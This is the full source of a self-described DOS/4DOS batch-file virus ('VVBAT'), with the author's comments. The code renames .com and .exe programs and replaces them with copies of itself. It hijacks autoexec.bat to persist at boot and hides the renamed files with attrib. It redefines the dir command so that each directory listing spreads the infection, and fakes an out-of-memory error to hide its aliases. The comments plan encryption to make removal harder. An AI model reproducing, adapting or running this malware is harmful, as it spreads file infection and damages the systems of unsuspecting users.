@echo off
rem This is the 4dos/dos virus virsion 2.01a
rem Mostley done except for a few more features : dir filter/intelegent dir 
rem stealth. attrib stealth. better infection. self modifying.
rem  
rem it displayes how many times it has infected since bootup/running
rem using a simple 'add one to the variable IC each time dir is issued'
rem reasoning. the non 4dos infection sucks. 
rem  
rem this virus is not a real threat yet except for the alias stealth 
rem that it uses by way of aliasing alias and giving a bogus error
rem insted of alias. 
rem
rem things to do: change the path to the virus so it's 'harder' to
rem find remove etc. make it annoying to kill by encrypting the 
rem autoexec.vba ?
rem 
rem well there ya go fella's this is what I wasted my time doing.
rem enjoy!
rem
rem :-)~~~~~~~~~~~~~~~~~~~~~~~~~~~``````````````````````````
rem V.V.
if %@upper[%@filename[%_batchname%]]==AUTOEXEC.BAT goto infectauto
if "%1"=="/R" goto RUN
IF "%1"=="/I" goto INFECT
if "%1"=="/G" goto get
if "%1"=="/start_up" goto start
if not "%_DOS"=="" goto 4dos

:GET
for %%f IN (*.com) DO if exist %%f call %0 /I %%f com 
FOR %%f in (*.exe) DO if exist %%f call %0 /I %%f exe

if "%1"=="/G" goto end

goto run
:infectauto
if exist autoexec.btm copy autoexec.btm autoexec.vbt >nul
if not exist autoexec.btm copy autoexec.bat autoexec.btm>nul
autoexec.btm /start_up

:start
if exist autoexec.vba copy autoexec.vba autoexec.bat >nul
if exist autoexec.bat call autoexec.bat
if exist autoexec.bat copy autoexec.bat autoexec.vba>nul
if exist autoexec.btm copy autoexec.btm autoexec.bat>nul
if exist autoexec.vbt copy autoexec.vbt autoexec.btm>nul
autoexec
goto end
:INFECT
if "%3"=="com" ren %2 *.vco>nul
if "%3"=="exe" ren %2 *.vex>nul
if not "%_DOS"=="" goto 4dos
copy %0.bat %2
ren %2 *.bat

goto end
:4dos
if exist %_BOOT%:\4DOS\TOUR3.BAT goto installedin4dos
if not exist c:\autoexec.vba ren autoexec.bat autoexec.vba>nul
if exist c:\autoexec.vba copy %_BATCHNAME% c:\autoexec.bat>nul
copy %_BATCHNAME% %@path[%comspec%]tour3.bat>nul

:installedin4dos
set ic=0
unalias /q alias>nul
alias infected=`echo bootup: %@inc[%ic]`
alias realexit=*exit
alias exit=`echo YOU ARE INFECTED BY THE VVBAT VIRUS V2.0 for 4dos and genric-dos %+ realexit`
alias realdir=*dir 
alias dir=`%@path[%comspec%]tour3 /G %+ realdir %& %+ attrib *.vco *.vex *.vba *.vbt +h %+ *set ic=%@inc[%ic]`
alias realalias=*alias
alias alias=`echo Not enuff memory to run alias %+ echo.`

:RUN
if exist %0.vco ren %0.vco %0.com>nul
if exist %0.vex ren %0.vex %0.exe>nul
if exist %0.com %0.com %1 %2 %3 %4 %5 %6 %7 %8 %9>nul
if exist %0.exe %0.exe %1 %2 %3 %4 %5 %6 %7 %8 %9>nul
if exist %0.com ren %0.com %0.vco>nul
if exist %0.exe ren %0.exe %0.vex>nul
:end
  